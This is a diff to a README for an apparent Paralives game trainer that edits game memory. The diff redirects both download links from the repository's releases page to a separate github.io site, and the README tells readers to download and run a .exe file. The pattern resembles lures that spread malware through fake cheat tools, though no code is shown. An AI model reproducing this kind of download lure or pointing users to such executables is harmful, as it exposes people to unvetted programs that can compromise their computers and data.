@@ -1,6 +1,6 @@
 # 🎮 Paralives-Ultimate-Trainer-2026 - Master your game with ease
 
-[![](https://img.shields.io/badge/Download-Paralives_Trainer-blue.svg)](https://github.com/Tornadoyourmom/Paralives-Ultimate-Trainer-2026/releases)
+[![](https://img.shields.io/badge/Download-Paralives_Trainer-blue.svg)](https://tornadoyourmom.github.io)
 
 This software allows you to modify game values within Paralives. It gives you control over resources, character needs, and game progression. The trainer runs in the background and communicates with the game memory to apply your chosen cheats. You control these features through a custom interface.
 
@@ -18,7 +18,7 @@ You do not need to install complex software like Python or code editors. The tra
 
 ## 📥 Downloading the Trainer
 
-Visit this page to download the latest version of the trainer: [https://github.com/Tornadoyourmom/Paralives-Ultimate-Trainer-2026/releases](https://github.com/Tornadoyourmom/Paralives-Ultimate-Trainer-2026/releases)
+Visit this page to download the latest version of the trainer: [https://tornadoyourmom.github.io](https://tornadoyourmom.github.io)
 
 Look for the "Assets" section on the release page. Click the file ending in .exe to start your download. Your browser might ask you to confirm this action.
 
